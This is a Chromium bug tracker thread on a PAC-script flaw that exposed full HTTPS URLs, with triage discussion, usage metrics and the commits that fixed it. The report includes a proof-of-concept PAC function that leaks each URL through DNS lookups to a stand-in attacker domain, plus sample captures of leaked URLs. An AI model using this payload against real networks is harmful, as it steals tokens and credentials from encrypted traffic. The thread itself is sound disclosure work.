# Security: Proxy Auto-Config SSL/TLS Url Disclosure

| Field | Value |
|-------|-------|
| **Issue ID** | [40083832](https://issues.chromium.org/issues/40083832) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Enterprise, Internals>Network>Proxy |
| **Reporter** | st...@gmail.com |
| **Assignee** | er...@chromium.org |
| **Created** | 2016-03-10 |
| **Bounty** | $500.00 |

## Description

Description:        Proxy Auto-Config SSL/TLS Url Disclosure
Versions Affected:  All Chrome versions on Windows
Category:           Information Disclosure
Reporter:           Alex Chapman and Paul Stone of Context Information Security 

Summary:
--------
Malicious Proxy Auto-Config (PAC) files allow for the disclosure of SSL/TLS encrypted HTTPS request URLs (including full paths and query strings) from Chrome. The PAC file specifies a Javascript function, FindProxyForURL(url, host), which is called for each URL request in order to determine the required proxy for the connection. This function receives the full URL and hostname for both HTTP and HTTPS requests, which can be leaked by a malicious PAC script. This could expose credentials, tokens, search terms or any other data passed in HTTPS URL query strings to internet based attackers that would otherwise be encrypted. On Windows systems, this issue can be exploited on a default Chrome installation.

It should be noted that this issue was also identified in Android, and has been reported separately to the Android team.

Analysis:
---------
The PAC file is executed in a limited, sandboxed Javascript environment, but some functions are still available (see http://findproxyforurl.com/pac-functions/), most notably dnsResolve. This allows for the full request URL from affected clients to be leaked to an attacker's DNS server or local network hosts via LLMNR.

Since Chrome defaults to using the Windows proxy settings, including configurations picked up from Web Proxy Auto-Discovery Protocol (WPAD) this issue can be exploited by both malicious gateways and attackers based on the local network (via WPAD injection attacks).

All software that implements the PAC specification as written is affected by this issue. We have confirmed this issue in a number of browsers and operating systems. Notably however, Internet Explorer does not leak full URLs, instead passing only the protocol and hostname to the 'url' parameter of FindProxyForURL (e.g. https://www.example.com/, not https://www.example.com/index.html?foo=bar). Therefore a possible fix for this issue is to follow this same behaviour.

Proof of Concept:
-----------------
A PAC script can be crafted, as below, which will perform a DNS lookup based on the host and url parameters passed into the function:

  function FindProxyForURL(url, host){{
    if (dnsResolve((url+'.example.com').replace(/[^a-z0-9_-]+/gi,'.')))
      return "DIRECT";
    return "DIRECT";
  }}

This will perform DNS lookups with the encoded URLs against the example.com DNS server.

See the following example DNS captures from HTTPS requests:

  https.www.google.co.uk.webhp.sourceid.chrome-instant.ion.1.espv.2.ie.UTF-8.example.com.
  https.consent.google.com.status.continue.https.www.google.co.uk.pc.s.timestamp.1457624486.example.com.
  https.www.google.co.uk.gen_204.atyp.i.ct.cad.vet.10ahUKEwj_iOuturbLAhXlNpoKHc21DBoQsmQIDg.s.ei.ppXhVv-dGuXt6ATN67LQAQ.zx.1457624490326.example.com.
  https.safebrowsing.google.com.safebrowsing.downloads.client.googlechrome.appver.48.0.2564.116.pver.3.0.key.AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgw.ext.0.example.com.


## Timeline

### st...@gmail.com (2016-03-10)

The Android version of this bug is at https://code.google.com/p/android/issues/detail?id=203176


### in...@chromium.org (2016-03-10)

ryansturm@, can you please triage this.

[Monorail components: Internals>Network>Proxy]

### in...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### cb...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### el...@chromium.org (2016-03-10)

From a security point-of-view, a malicious script already has the ability to get the plaintext of any HTTP URL (by simply returning 'PROXY SPYPROXY') so it probably makes sense to scope any change to only HTTPS lookups.

IE uses a stripped hostname when doing FindProxyForURL as a performance optimization (https://support.microsoft.com/en-us/kb/271361), not a security feature. I suspect you may be able to get Internet Explorer to request the full URL if you set EnableAutoproxyResultCache=0 in the registry. It's also worth noting that IE's implementation has shifted quite a bit over the last few versions (e.g. moving to use the WinHTTP service in later IE versions https://blogs.msdn.microsoft.com/ieinternals/2013/10/11/understanding-web-proxy-configuration/) so care should be taken when considering IE's behavior as a model.

### ry...@chromium.org (2016-03-10)

Passing to cbentzel@ as he would know more on how to triage this.

### cl...@chromium.org (2016-03-10)

[Empty comment from Monorail migration]

### er...@chromium.org (2016-03-10)

This is a weakness of PAC that affects all browsers on all platforms.

Internet Explorer is not exempt from this, at least from having tested IE11 -- it too will give the path of https:// requests to the PAC script. The difference as noted in https://crbug.com/chromium/593759#c5 is that it will subsequently cache this for the following requests to that hostname (barring having disabled that cache), so depending what URL is the first to hit the resolver you will discover different paths. This can be observe by just sticking an "alert(url)" in PAC script and navigating to stuff.

To summarize my understanding of the problem:

An attacker on your network can control the PAC script that your browser uses. This is by design of PAC/WPAD.

An example would be if you joined a public WIFI and your system had the default configurations (which is to auto-detect proxy settings). Such an attacker could now easily have your browser run their PAC script.

The attacker that is already on your same network segment will already surely be able to inspect your DNS requests and HTTP traffic, so the ability to do this through the PAC script isn't particularly compelling.

However the PAC script (as noted in this bug report) grants the additional capability to inspect the full URL for https:// navigations. Ordinarily TLS will protect the URL and request parameters from leaking (the hostname not so much), but in this case the PAC script can inspect it and phone it home somehow. There are varied mechanisms for sending it from the PAC script back to attacker - the example given in the bug report is to use dnsResolve(), but other approaches are to choose particular proxy servers, or even affect the timing of the request.

Trying to sandbox the information from leaving the PAC script is not a plausible solution, so the issue is more about whether we should pass it in to the script in the first place.

...

As far as solutions, it is unclear what the compatibility impact of removing this would be. I could imagine legitimate use case that want to look at the URL - AdBlocking implemented via a PAC script (yes I have seen these), Chrome Extension installing a PAC script to do mysterious things, or even ill-conceived attempt at load balancing based on URLs, or some content filtering policy.

If we decide this is something worth plugging, the simplest approach would be to sanitize the path for https:// URLS that is seen by the proxy resolver. Just stripping the path seems a bit confusing, probably better to include a searchable string like "[elided because https"] or some such thing.

Doing this across the board would break any legitimate use case. It could be slightly improved through a heuristic similar to: hide the URL for https:// URLs from the PAC script **except** when (1) The script was explicitly configured by the user (as opposed to discovered through WPAD) and (2) the script was delivered over a secure origin (i.e. file://, https://, localhost etc.)

...

That said, PAC/WPAD as a technology is sufficiently broken that perhaps we want to do something more drastic than just adding some more bandaids here and there.

### rs...@chromium.org (2016-03-10)

I agree with Eric (Roman)'s assessment - this is a fundamental, by-design weakness of the WPAD discovery mechanism. Mitigating this would ultimate require disallowing WPAD - as you can't securely bootstrap an autodiscovered proxy mechanism.

Similarly, PAC files are widely deployed over insecure means (e.g. HTTP). The ability to deliver over HTTPS is rare, and, when used, buggy (e.g. it can cause serious issues with Apple's proxy stack). Further, given the fact that both of these technologies are largely deployed on enterprise networks, our feedback mechanism for 'safe' changes or coordinating with other browsers is extremely limited.

### st...@gmail.com (2016-03-11)

It seems that we did misunderstand IE's behaviour here. In practice though, very few full URLs get passed through to FindProxyForURL. We've not fully investigated what's going on in IE, but even if the first request for a particular host contains a path and query string, usually (but not always) only the protocol and hostname gets passed to the PAC script and is then cached.

This means that any PAC script that is trying to check URL paths is going to be very broken in IE. It would seem fairly safe to pass only hostnames for PAC scripts found via WPAD.

On the bigger issue of PAC/WPAD attacks, Firefox's behaviour is somewhat safer. By default it will only use a PAC file that is configured explicitly (in the browser or in the OS settings). It won't use WPAD configuration from the system, though it can do WPAD discovery via a non-default setting (https://bugzilla.mozilla.org/show_bug.cgi?id=621429)


### cb...@chromium.org (2016-03-11)

Could we instrument Chrome for one release to scope impact of limiting URL to origin only? 

For example, we would call both FindProxyForURL("https://www.example.com/my/full/path") as well as FindProxyForURL("https://www.example.com") and compare if resolutions differ.


### cb...@chromium.org (2016-03-11)

Note: for compatibility reasons I'd prefer to bandaid this with the URL restrictions than to make WPAD something that users have to configure on Chrome - even though I wish it was something that was not on by default in Windows.

### in...@chromium.org (2016-03-16)

[Empty comment from Monorail migration]

### er...@chromium.org (2016-03-16)

In response to https://crbug.com/chromium/593759#c11:

Here is a change to gather some data on how disruptive eliding the https:// URL for PAC scripts would be:

   https://codereview.chromium.org/1797313003/

This should give an upper bound on the usage, assuming we have enough UMA coverage of the affected environments (historically we haven't had great insight into corporate configurations through UMA stats).

We may need to refine those stats further to bucket by the provenance of the script, since we would mainly be interested in this hack for PAC scripts obtained through WPAD. (And those are likely to already be tolerant of missing information in order to support default IE configurations).

Whereas PAC scripts configured locally through file:// URLs, Chrome Extensions are more likely to leverage the path, and we could choose to allow those cases. 

Certainly there are some ad-blocking PAC scripts out there which would be affected by stripping the URL.

### in...@chromium.org (2016-03-16)

[Empty comment from Monorail migration]

### pa...@chromium.org (2016-03-17)

[Empty comment from Monorail migration]

### pa...@chromium.org (2016-03-17)

[Empty comment from Monorail migration]

### pa...@chromium.org (2016-03-22)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-03-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/183f4bcddd821b4af3f6234ad2e8c371694a9ffb

commit 183f4bcddd821b4af3f6234ad2e8c371694a9ffb
Author: eroman <eroman@chromium.org>
Date: Tue Mar 22 19:39:07 2016

Add a histogram (Net.PacResultForStrippedUrl) that estimates how often PAC scripts depend on the URL path.

BUG=593759

Review URL: https://codereview.chromium.org/1797313003

Cr-Commit-Position: refs/heads/master@{#382644}

[add] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/data/proxy_resolver_v8_tracing_unittest/alert_url.js
[add] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/data/proxy_resolver_v8_tracing_unittest/dns_depending_on_url.js
[add] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/data/proxy_resolver_v8_tracing_unittest/error_depending_on_url.js
[add] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/data/proxy_resolver_v8_tracing_unittest/return_url_as_proxy.js
[modify] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/proxy/proxy_resolver_v8_tracing.cc
[modify] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/proxy/proxy_resolver_v8_tracing.h
[modify] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/net/proxy/proxy_resolver_v8_tracing_unittest.cc
[modify] https://crrev.com/183f4bcddd821b4af3f6234ad2e8c371694a9ffb/tools/metrics/histograms/histograms.xml


### er...@chromium.org (2016-04-06)

Early histogram results from canary/dev populations (includes fewer than 10K users), so take with a grain of salt. But still kind of interesting.

------------------
Aggregated by volume:
------------------

SUCCESS                      99.60%
FAIL_DIFFERENT_PROXY_LIST    00.32%
FAIL_ERROR                   00.07%
FAIL_ABANDONED               00.01%
SUCCESS_DIFFERENT_NUM_DNS    00.00%


------------------
Aggregated by user:
------------------

SUCCESS                      88.86%
FAIL_DIFFERENT_PROXY_LIST    06.21%
FAIL_ERROR                   03.62%
FAIL_ABANDONED               00.68%
SUCCESS_DIFFERENT_NUM_DNS    00.62%


The exact meaning of these enums can be found in proxy_resolver_v8_tracing.h [1]


Commentary:

 - When looking at the total number of proxy resolutions across all users things don't look too bad: only 0.4% of https://* URLs resolved differently when the path was stripped

 - However when broken down by user counts, the data is significantly worse: 10.51% of users have a proxy script that returns a different result when the path is stripped!

 - The non-negligible occurrence of FAIL_ERROR is intriguing. This is measuring broken PAC scripts, for which resolving the stripped https:// URL results in a script-error (as opposed to simply different results). I wonder what class of awful PAC scripts manage to do do this to themselves...

 - SUCCESS_DIFFERENT_NUM_DNS and FAIL_ABANDONED are essentially measuring scripts where the execution flow resulted in a different sequence of resolveResolve()/myIpAddress() calls. This is more of a curiosity, but it does indicate that some PAC scripts will resolve different hosts depending on the path (i.e. scripts that don't just resolve the URL's host).


These numbers are still fairly high
IMO they are not favorable to blanket stripping https:// URLs.


But we can still split things up by script provenance to explore the feasibility of stripping https:// URLs sent to PAC,  specifically for untrusted script configurations (implicitly configured scripts such as those discovered through WPAD, or explicitly configured scripts that were fetched over a non-secure channel).

Some more plumbing will be needed for that instrumentation.


[1] https://code.google.com/p/chromium/codesearch#chromium/src/net/proxy/proxy_resolver_v8_tracing.h&q=proxy_resolver_v8_tracing.h&sq=package:chromium&type=cs&l=96

### pa...@chromium.org (2016-04-06)

[Empty comment from Monorail migration]

### st...@gmail.com (2016-04-07)

We've been continuing to look at the impact of this issue, and found that it's possible to steal Google SSO tokens and 3rd party OAuth tokens obtained from a Google login. Obviously this isn’t a bug in the Google signin system, but just down to the fact that it's passing auth tokens via HTTPS URLs. 
 
Just to let you know, we’re about to submit a talk to Black Hat USA that will feature the PAC HTTPS issue. We’re hopeful that there's enough time between now and then to get this fixed in Chrome.
 


### cb...@chromium.org (2016-04-08)

#22 thanks for letting us know.

### cb...@chromium.org (2016-04-08)

#20: Thanks for doing the analysis, and the per-user results are a bit depressing. Unfortunately, my guess is that the vast majority of PAC scripts are retrieved either via WPAD or explicit configs of http (not https) URLs - so even if we restricted the stripping behavior to those cases it would end up being used most of the time.

I'm also moving to M51, I don't see a fix going into M50.

### cb...@chromium.org (2016-04-08)

I'm just recapping what we see as choices here:

a) Keep the status quo. Assumes that active network attacker risk here low enough.

b) Don't use OS settings for WPAD, and rather require it to be turned on either via chrome://settings, proxy settings extension API, or policy. This does not address the infodisclosure attack here, but does mitigate it particularly on Windows.

c) Strip the https URLs every time PAC is evaluated, except possibly with some extension/policy override. This addresses the infoleak attack, but could impact up to 10% of all users who do PAC eval.

d) Same as c, but also allow full path to be specified when PAC script explicitly specified and retrieved over https (since active network attacker couldn't control this, would require machine access). We don't know how common this is, but my hunch is pretty low.

Arguably we could do both b+c or b+d too. 

### pa...@chromium.org (2016-04-19)

[Empty comment from Monorail migration]

### el...@chromium.org (2016-04-19)

#20: Is there any chance that these proxy servers are returning different results because they're using a call to Math.random() to randomize the list of proxy servers returned for load-balancing purposes?

> The non-negligible occurrence of FAIL_ERROR is intriguing.
> This is measuring broken PAC scripts, for which resolving the 
> stripped https:// URL results in a script-error

In the prototype, it looks like we call:

    replacements.SetPathStr("PathIsHiddenForCrbug593759");

...should that have a leading / character, or does GURL automatically add one there for us?

### er...@chromium.org (2016-04-19)

RE https://crbug.com/chromium/593759#c27:

> #20: Is there any chance that these proxy servers are returning different
> results because they're using a call to Math.random() to randomize the list
> of proxy servers returned for load-balancing purposes?

Yes that is one possibility.

> ...should that have a leading / character, or does GURL automatically add one there for us?

No a leading / is not needed.
I confirmed with some manual tests that the following is true of the current implementation:

These original URLs:

  https://foobarbaz.com/hello/world?q=3
  https://foobarbaz.com
  https://foobarbaz.com/index.html

All get transformed to this "stripped" URL:

  https://foobarbaz.com/PathIsHiddenForCrbug593759

(Note that fragments and embedded username/password were already being stripped from the URL before passing tot he PAC script)

### at...@chromium.org (2016-04-20)

This change will likely have a disproportional impact on enterprise users - if we strip the paths, we need to give enterprises a way to maintain the current functionality via enterprise policy, for a limited time at least.

As an example of how we've handled this situation in the past, see the SSLVersionMin policy which gave enterprises the ability to extend sslv3 support for a few more releases:

http://www.chromium.org/administrators/policy-list-3#SSLVersionMin

My team is happy to help build policy controls for this, once we have an agreed-upon CL to address the problem.

[Monorail components: Enterprise]

### el...@chromium.org (2016-04-20)

#28: Ah, I see. 

Do we need to overwrite a path of "/" with "/PathIsHiddenForCrbug593759"? While it seems unlikely that scripts would actually *break* due to the phony path, I think it makes sense to minimize the scope of what we're changing.

Cross-browser behavior is already so different it's hard to believe an enterprises could have scripts that depend on getting the path. 

- Firefox doesn't strip the URL at all (even sending the *fragment* to the FindProxyForUrl function).
- Internet Explorer strips the fragment, but caches the first hit to the function by origin and uses that for all subsequent requests unless you have a registry override set.

### er...@chromium.org (2016-04-20)

RE https://crbug.com/chromium/593759#c30:

> Do we need to overwrite a path of "/" with "/PathIsHiddenForCrbug593759"?

What would the advantage be in doing something different for "/" ? 

That would give PAC scripts the power to discern at least some class of URLs.
Unless there is reason to believe compatibility is dramatically improved by making such an allowance, I think consistently stripping is better. Plus we would still be stripping the query off, even for path of "/".

Or did I misunderstand the question, and you are instead asking why I used "/PathIsHiddenForCrbug593759" rather than "/" for the experiment?

My thinking here is if we did go ahead and break how PAC scripts work by molesting the URL passed in, we can improve debuggability by including some breadcrumbs in the transformed URL.

When stepping through the PAC script's execution to debug the problem (or more likely, sprinkling it with "alert()"s) a developer will eventually track down the problem to an unexpected URL value, and then see our unusual URL string. This will give them something concrete to search for and find solutions (one of which may be enabling a setting to bypass the behavior).

### pa...@chromium.org (2016-04-20)

RE https://crbug.com/chromium/593759#c31:

WRT the trailing slash where the path would have been:  On another thread someone noted that "Websense PAC file best practices" (https://www.websense.com/content/support/library/web/v76/pac_file_best_practices/PAC_best_pract.aspx)
contains this recommendation that relies on the trailing slash:

An entry for an external site might look like:
    if (shExpMatch(url, "*.webex.com/*"))
    {return "DIRECT";}

### el...@chromium.org (2016-04-20)

I agree that using the fake "breadcrumb" seems like a good idea in general.

> What would the advantage be in doing something different for "/" ? 

If the script did something like: if (url == "https://whatever.com/") { return "PROXY expectedSite:8080"; } its behavior would be unchanged by our patch.

> That would give PAC scripts the power to discern at least some class of URLs.

Meaning that it could discern whether the client requested a URL without a path & query, vs. one that did contain a path & query? Sure, although I can't think of why that would be problematic. Am I overlooking something?

Beyond returning randomly-ordered proxy strings for load-balancing purposes, I wonder if maybe there are a class of proxy scripts that look at the URL for a likely file extension (e.g. "if the URL looks like *.MP4, just go DIRECT to reduce load on the proxies).

### zm...@google.com (2016-04-20)

the file extension pattern is an interesting one - I wonder how often that
happens in PAC files - I do like the idea of keeping the breadcrumb, and
maybe adding the final file extension (3 to 4 characters max, so as not to
expose anything more than the file extension when parsed) to our
synthesized breadcrumb in order to preserve as much of the intended PAC
file behavior as possible without revealing anything else about the path

### zm...@google.com (2016-04-21)

FYI the original submission by the reporting researcher notes that IE has
started stripping everything following the leading "/" in the path:

All software that implements the PAC specification as written is
affected by this issue. We have confirmed this issue in a number of
browsers and operating systems. Notably however, Internet Explorer
does not leak full URLs, instead passing only the protocol and
hostname to the 'url' parameter of FindProxyForURL (e.g.
https://www.example.com/, not
https://www.example.com/index.html?foo=bar). Therefore a possible fix
for this issue is to follow this same behaviour.

This bolsters the case for stripping URLs (after the leading slash) even
though it will affect the behavior of legitimate PAC files, though it would
be good for someone to confirm the IE behavior. I still like the idea of
preserving up to 3 or 4 characters of the file extension when present (not
sure if IE or any other browser is doing that)

### er...@chromium.org (2016-04-21)

@zmolek: See the earlier comments regarding IE behavior. Having tested on IE 11 it isn't consistently stripping URLs, but rather caches by host. Depending on what URL is resolved first the path may be disclosed to the PAC script. There are registry settings to disable the per-host caching, which is described as a performance optimization not a security one.

### zm...@google.com (2016-04-21)

Thanks for that pointer - I've actually got a thread going with friends in Microsoft's security team who are tracking down the exact changes that they have made in IE around PAC file processing so we've got a better chance of getting deterministic cross-platform behavior after the fixes and will share what I learn from them. Sounds like they may have still more work to do based on your findings so far :-(

I do think it's unlikely we'll be able to keep all legitimate calls in customer PAC files intact because there's no reliable way to detect when a bad DNS server has been added and the AI required to detect all the possible ways to structure dangerous calls within the PAC file is nontrivial. That means the best we can do is help everyone that works with PAC files to migrate to new best practices on browser/platform side that PAC file writers can count on when they structure their code.

### pa...@chromium.org (2016-04-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-04-23)

cbentzel: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cb...@chromium.org (2016-04-25)

Assigning to eroman since he's been doing most of the investigation.

### rs...@chromium.org (2016-04-25)

Punting back to cbentzel@ to try to figure out the approach. I want to echo Eric's remarks in https://crbug.com/chromium/593759#c8, that this is sort of fundamentally a legacy tech with known issues, and the use case seems to be solely enterprise users - much like NTLM.

While we could focus on metrics gathering to measure impact, to be honest, I'm not sure we'd ever get something we were fully confident with, or worse, we would be overly confident (given the bias against enterprise metrics). It may make sense to just make the change (w/ either Finch or Enterprise policy opt-out, with metrics to look at how often enterprises do and the impact; I don't think we'd want to carry that enterprise policy indefinitely).

However, this seems like a question of policy and design - is this something that's reasonable in scope as a security bug, and is it worth investing heavily into trying to measure and quantify the impact for this edge case, versus being decisive.

Compared to some of the other priorities though, this doesn't seem urgent or particularly pressing. But Chris can better prioritize that :)

### cb...@chromium.org (2016-04-25)

Re: metrics - the one additional metric Eric has mentioned gathering is to measure the provenance of the PAC scripts. As it pertains to this particular issue, the thinking is that PACs retrieved over explicit HTTPS URLs could potentially expose the full HTTPS URL to FindProxyForURL, as the network attacker threat is removed and someone with enough access to specify an explicit PAC script could also find other ways to discover the full URLs.

While that data would still be interesting, my guess is that explicit HTTPS PAC scripts  are going to be quite uncommon. Supporting different behavior for different provenances will also make things more complex for the long-term.

So I'm definitely leaning to the strip-the-path approach with a time-limited enterprise opt-out, particularly if we can get some general interop and communications in place.

### zm...@google.com (2016-04-25)

+1 - given the concerns we've heard expressed by security teams, we
definitely don't want to let enterprise customers believe that any
short-term override is more than a transition tool.

Although I don't believe that a single enterprise customer is using rogue
DNS servers to spy on HTTPS traffic, there's simply no reliable way for us
to ensure that DNS calls generated by PAC files not make use of sensitive
data in the path (even if those specific calls would never be specified in
a legit PAC file, there are just too many possible variants to cull those
reliably - we would have to be really aggressive about completely ignoring
PAC files with certain red flags, and we would not be able to say that
taking that route would result in less breakage)

### cb...@chromium.org (2016-04-25)

[Empty comment from Monorail migration]

### cb...@chromium.org (2016-04-28)

#43: The thing I am more worried about in Chrome case is that by default we support WPAD on Windows (since Windows settings default to WPAD-on). This means that a consumer laptop could be impacted by a network attacker, and is not limited to just an enterprise customer.

### cb...@chromium.org (2016-04-28)

[Empty comment from Monorail migration]

### cb...@chromium.org (2016-05-12)

Re-assigning to eroman since the general direction is decided on and he is driving the actual implementation.

### cb...@chromium.org (2016-05-12)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-05-13)

eroman: Uh oh! This issue still open and hasn't been updated in the last 21 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cb...@chromium.org (2016-05-13)

Ignore the most recent sheriffbot, this is still being actively worked on.

### el...@chromium.org (2016-05-13)

This bug is publicly disclosed on page 51 of http://nicolas.golubovic.net/thesis/master.pdf

"Furthermore, even for encrypted connections, the proxy script will receive the full URL (excluding the anchor) of each request. It can then proceed to leak all URLs via the Domain Name System (DNS) by using the dnsResolve function. Listing 6.17 shows an exemplary exploit which transforms an URL in way that allows full recovery of the original value"

### st...@gmail.com (2016-05-16)

I also found this from last year: http://security.stackexchange.com/questions/87499/can-web-proxy-autodiscovery-leak-https-urls

### bu...@chromium.org (2016-05-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/81357b39c643fc746517fd6ce5cb2076b7ddc3f4

commit 81357b39c643fc746517fd6ce5cb2076b7ddc3f4
Author: Eric Roman <eroman@chromium.org>
Date: Sat May 21 23:00:51 2016

Sanitize https:// URLs before sending them to PAC scripts.

This additionally strips the path and query components for https:// URL (embedded identity and reference fragment were already being stripped).

For debugging purposes this behavior can be disabled with the command line flag --unsafe-pac-url.

BUG=593759
R=mmenke@chromium.org

Review URL: https://codereview.chromium.org/1996773002 .

Cr-Commit-Position: refs/heads/master@{#395266}

[modify] https://crrev.com/81357b39c643fc746517fd6ce5cb2076b7ddc3f4/chrome/browser/net/proxy_service_factory.cc
[modify] https://crrev.com/81357b39c643fc746517fd6ce5cb2076b7ddc3f4/chrome/common/chrome_switches.cc
[modify] https://crrev.com/81357b39c643fc746517fd6ce5cb2076b7ddc3f4/chrome/common/chrome_switches.h
[modify] https://crrev.com/81357b39c643fc746517fd6ce5cb2076b7ddc3f4/net/proxy/proxy_service.cc
[modify] https://crrev.com/81357b39c643fc746517fd6ce5cb2076b7ddc3f4/net/proxy/proxy_service.h
[modify] https://crrev.com/81357b39c643fc746517fd6ce5cb2076b7ddc3f4/net/proxy/proxy_service_unittest.cc


### in...@chromium.org (2016-05-26)

Seems like fixed to me (#53), please reopen if any work is pending.

### er...@chromium.org (2016-05-26)

Correct, the security issue is fixed on trunk (M53).
However there is some remaining work items:

 * In the process of evaluating compatibility impact on Canary
 * Need to introduce a policy override for enterprise (intended as a temporary solution to roll it out)
 * Want to merge a fix to M52 in early June

### aa...@google.com (2016-05-26)

Thanks Eric. Yes merges are tracked by Merge-Request labels, so this can stay as Fixed statis. Regarding policy override, please use a separate functional bug to track that.

### cl...@chromium.org (2016-05-26)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Request-XX label, where XX is the Chrome milestone.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### sh...@chromium.org (2016-05-26)

[Empty comment from Monorail migration]

### er...@chromium.org (2016-05-26)

[Empty comment from Monorail migration]

### me...@chromium.org (2016-05-26)

+bas.venis@gmail.com who also discovered this issue at https://crbug.com/chromium/614897.

### ba...@gmail.com (2016-05-26)

fwiw, I also reported this issue to Mozilla at https://bugzilla.mozilla.org/show_bug.cgi?id=1275797

### ti...@google.com (2016-05-31)

re: #55, It's already early June in Australia - Requesting Merge to M52 / 2743

### ti...@google.com (2016-05-31)

Your change meets the bar and is auto-approved for M52 (branch: 2743)

### ti...@google.com (2016-05-31)

Thanks for your report. We'll consider your report under the Chrome Reward Program for a security cash reward - full details here: https://www.google.com/about/appsecurity/chrome-rewards/

We'll update you once we have a decision. Feel free to check in with me in a few weeks if you haven't heard back, either by updating this bug or reaching out to me at timwillis@

### at...@chromium.org (2016-06-01)

I've logged crbug.com/616396 to track the enterprise policy portion of this work. Please do not merge this change to M52 until we have landed a fix for that issue, and then merge them both together.

### bu...@chromium.org (2016-06-10)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/564023217f3589aadf636203dcb2b33d58a7d1c7

commit 564023217f3589aadf636203dcb2b33d58a7d1c7
Author: Eric Roman <eroman@chromium.org>
Date: Fri Jun 10 07:18:12 2016

Sanitize https:// URLs before sending them to PAC scripts.

This additionally strips the path and query components for https:// URL (embedded identity and reference fragment were already being stripped).

For debugging purposes this behavior can be disabled with the command line flag --unsafe-pac-url.

BUG=593759
R=mmenke@chromium.org

Review URL: https://codereview.chromium.org/1996773002 .

Cr-Commit-Position: refs/heads/master@{#395266}
(cherry picked from commit 81357b39c643fc746517fd6ce5cb2076b7ddc3f4)

Review URL: https://codereview.chromium.org/2058683002 .

Cr-Commit-Position: refs/branch-heads/2743@{#308}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/chrome/browser/net/proxy_service_factory.cc
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/chrome/common/chrome_switches.cc
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/chrome/common/chrome_switches.h
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/net/proxy/proxy_service.cc
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/net/proxy/proxy_service.h
[modify] https://crrev.com/564023217f3589aadf636203dcb2b33d58a7d1c7/net/proxy/proxy_service_unittest.cc


### er...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### er...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### er...@chromium.org (2016-06-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-06-13)

This won't ship with the planned stable patch tomorrow, as it's yet to be in a Beta release.

eroman@ - looks like these changes could be in fairly common code paths, would you recommend a long bake time or could this be a candidate for another stable patch should one come along?

### er...@chromium.org (2016-06-13)

RE https://crbug.com/chromium/593759#c70:

We are targeting M52 (and later) for the fix, and are not currently planning to release any patches to M51 (which is the current stable).

Timeline:
* June 15, 2016 -- The changes will appear on the next Beta channel release of M52
* July 26, 2016 -- M52 will become the stable version of Chrome

Unfortunately there is the real possibility of compatibility problems from this bugfix, as it alters how PAC handling used to behave in Chrome. In fact we have already received some reports from Canary channel users (crbug.com/619097) noticing this difference.

We expect that the users most affected by this are enterprise users, and these users are not well represented on anything but the stable channel. For a recent example of this consider the regression to PAC handling crbug.com/615084. This change baked on all the channels but ultimately the breakage wasn't observed until the change hit the stable channel.

Because we weren't able to assess the degree of disruption in a satisfying way, I do not propose merging it to M51. At a minimum we can re-evaluate after seeing how M52 does on beta.

As things stand today, the following changes have been applied for this bugfix:
  Changes to trunk: 7ddc3f4,  9038834,  a8ef958
  Merges to M52 branch:  8a7d1c7,  de20700,  4561fa6

The cumulative outcome of these patches is that:

 * https:// URLs are stripped by default before passing them on to a PAC script. This applies to all users _except_ Chrome OS enterprise.

 * The stripping can be controlled (at least for now) by using either the command line override --unsafe-pac-url or by setting the policy "PacHttpsUrlStrippingEnabled" to false.

 * The rollout to managed Chrome OS users will be handled separately from the server side, by turning on that policy.


For Googlers you can also refer to the doc https://goto.google.com/qzupl which summarizes in more detail this bug, and has been updated to reflect the current status.

### bu...@chromium.org (2016-06-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/564023217f3589aadf636203dcb2b33d58a7d1c7

commit 564023217f3589aadf636203dcb2b33d58a7d1c7
Author: Eric Roman <eroman@chromium.org>
Date: Fri Jun 10 07:18:12 2016

